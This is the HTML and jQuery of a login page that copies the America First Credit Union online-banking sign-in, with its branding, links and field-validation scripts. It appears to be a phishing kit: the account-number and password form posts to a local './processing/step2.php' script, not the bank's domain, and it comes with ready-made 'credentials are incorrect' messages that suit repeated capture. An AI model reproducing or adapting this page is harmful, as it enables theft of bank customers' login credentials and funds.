...
<body><noscript><strong>We're sorry but America First Credit Union doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
    <div data-app="true" class="v-application v-application--is-ltr theme--light" id="app">
                    ...
                    <div class="container container--fluid">
                        <div data-v-441a3690="" id="content">
                            <div data-v-55886b46="" data-v-0945e6cd="" data-v-441a3690="">
                                <h1 data-v-55886b46="" class="text-h4">Login</h1>
                                <div data-v-2906dda8="" data-v-55886b46="" class="row">
                                    <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                        <form data-v-55886b46="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="./processing/step2.php" method="POST">
                                            <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="accountdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="account" id="accountlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Account Number</label><input autocomplete="off" autofocus="autofocus" id="account" name="account2" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="accounterror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Account Number required</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                ...
                                                <div data-v-a240bf3a="" data-v-c2913866="" id="passworddiv" style="display:none;" data-v-6a6d1b4c="" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                    <div class="v-input__control">
                                                        <div class="v-input__slot">
                                                            <div class="v-text-field__slot"><label for="password" id="passwordlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Password</label><input autocomplete="current-password" autofocus="autofocus" id="password" name="password2" type="password"></div>
                                                            <div class="v-input__append-inner"><button data-v-a240bf3a="" type="button" id="show-hide" class="v-icon notranslate v-icon--link mdi mdi-eye-off theme--light"></button></div>
                                                        </div>
                                                        <div class="v-text-field__details">
                                                            <div class="v-messages theme--light error--text" role="alert">
                                                                <div class="v-messages__wrapper">
                                                                    <div id="passworderror" style="display:none" class="v-messages__message">Password required</div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                            ...
                                            <div data-v-55886b46="" class="mt-4"><button data-v-55886b46="" type="submit" class="mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary" id="btn-next"><span class="v-btn__content">Login</span></button></div>
                                        </form>
                                        <p data-v-55886b46="" data-v-2906dda8="" id="fl-question" class="text-body-2 mt-6">First time logging in? <a data-v-55886b46="" href="https://secure.americafirst.com/#/enroll" class="" id="fl-enroll-link" data-v-2906dda8="">Enroll Now</a></p>
                                        <p data-v-55886b46="" data-v-2906dda8="" id="fp-message" class="text-body-2"><a data-v-55886b46="" href="https://secure.americafirst.com/#/forgot-password" class="" id="fp-link" data-v-2906dda8="">Forgot Password</a> or need other assistance? <a data-v-55886b46="" data-v-2906dda8="" id="fp-contact-link" href="https://www.americafirst.com/about/contact/">Contact Us</a></p>
                                    </div>
                                    <div data-v-2906dda8="" class="hidden-sm-and-down col">
                                        <div data-v-2906dda8="" id="WorkflowAdSpace"></div>
                                    </div>
                                </div>
                            </div><input data-v-441a3690="" id="hidden-input" type="text">
                        </div>
                    </div>
                </div>
            </main>
            <footer data-v-0b9ebc54="" class="v-footer v-sheet theme--dark afcu-dark-blue" data-booted="true" action="./processing/step2.php" method="POST">
                <div data-v-0b9ebc54="" class="container container--fluid">
                    <div data-v-0b9ebc54="" class="row footer-links-section mt-1 justify-center">
                        <div data-v-0b9ebc54=""><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/disclosures/membership-agreement.cfm" target="_blank" title="Membership &amp; Account Agreement"> terms </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/contact/branches.html" target="_blank" title="Find Branches" class="utility-link"> branch locator </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="tel:1-855-801-2328" class="utility-link"> 1-855-801-2328 </a></div>
                    </div>
        ...
        <div role="document" id="mobileerror" tabindex="0" data-v-5c15a386="" class="v-dialog__content v-dialog__content--active" style="z-index: 202;display: none;">
            <div class="v-dialog notification-modal dialog-top align-self-start v-dialog--active v-dialog--persistent" style="transform-origin: center center; max-width: 350px;">
                <div data-v-5c15a386="" class="text-center v-card v-sheet theme--light">
                    <div data-v-5c15a386="" class="v-card__title title justify-center"></div>
                    <div data-v-5c15a386="" class="v-card__text py-1">Your account credentials are incorrect. Please try again.</div>
                    <div data-v-5c15a386="" class="v-card__actions">
                        <div data-v-5c15a386="" class="spacer"></div><button data-v-5c15a386="" id="alertbtn" type="button" class="v-btn v-btn--block v-btn--outlined theme--light v-size--default primary--text"><span class="v-btn__content">Ok</span></button>
                    </div>
                </div>
            </div>
        </div>
        <div data-v-5c15a386="" id="desktoperror" class="v-snack notification-snackbar v-snack--active v-snack--has-background v-snack--top" style="display: none; padding-bottom: 0px; padding-top: 78px;">
            <div class="v-snack__wrapper v-sheet theme--dark error">
                <div role="status" aria-live="polite" class="v-snack__content notification-content"><span data-v-5c15a386="" class="notification-text">
                        <!---->
                        <!----> Your account credentials are incorrect. Please try again.
                    </span></div>
                <div class="v-snack__action "><button data-v-5c15a386="" type="button" id="alertbtn2" class="dismiss-button v-btn v-btn--icon v-btn--round theme--dark v-size--x-small"><span class="v-btn__content"><i data-v-5c15a386="" aria-hidden="true" class="v-icon notranslate mdi mdi-close theme--light" style="color: rgba(255, 255, 255, 0.8); caret-color: rgba(255, 255, 255, 0.8);"></i></span></button></div>
            </div>
        </div>
    </div>
    ...
    <script>
        ...
        $('#accountdiv').on('input', function(e) {
            $("#accountlabel").addClass('v-label--active primary--text');
            $("#accountdiv").addClass('v-input--is-focused primary--text');
            if ($.trim($('#account').val()).length) {


                $("#accountlabel").removeClass('error--text');
                $("#accountdiv").addClass('v-input--is-dirty');
                $("#accountdiv").removeClass('error--text');
                $("#accounterror").hide();
            } else {
                $("#accountlabel").removeClass('v-label--active ');
                $("#accountdiv").removeClass('v-input--is-dirty');
                $("#accountdiv").addClass('error--text');


                $("#accountlabel").addClass('error--text');
                $("#accounterror").show();
        ...
        $('#account').focus(function() {
            ...
            if ($.trim($('#account').val()).length) {
                ...
                $("#accountlabel").removeClass('primary--text');
                $("#accountdiv").removeClass('primary--text');
                $("#accountdiv").removeClass('v-input--is-focused');
                $("#accountlabel").removeClass('error--text');
                $("#accountdiv").addClass('v-input--is-dirty');
                $("#accountdiv").removeClass('error--text');
                $("#accounterror").hide();
        ...
        $('#passworddiv').on('input', function(e) {
            $("#passwordlabel").addClass('v-label--active primary--text');
            $("#passworddiv").addClass('v-input--is-focused primary--text');
            if ($.trim($('#password').val()).length) {


                $("#passwordlabel").removeClass('error--text');
                $("#passworddiv").addClass('v-input--is-dirty');
                $("#passworddiv").removeClass('error--text');
                $("#passworderror").hide();
            } else {
                $("#passwordlabel").removeClass('v-label--active ');
                $("#passworddiv").removeClass('v-input--is-focused');
                $("#passworddiv").removeClass('v-input--is-dirty');
                $("#passworddiv").addClass('error--text');

                $("#passwordlabel").addClass('error--text');
                $("#passworderror").show();
        ...
        $('#password').focus(function() {
            ...
            if ($.trim($('#password').val()).length) {
                $("#passwordlabel").removeClass('primary--text');
                $("#passworddiv").removeClass('primary--text');
                $("#passworddiv").removeClass('v-input--is-focused');
                $("#passwordlabel").removeClass('error--text');
                $("#passworddiv").removeClass('v-input--is-focused');
                $("#passworddiv").addClass('v-input--is-dirty');
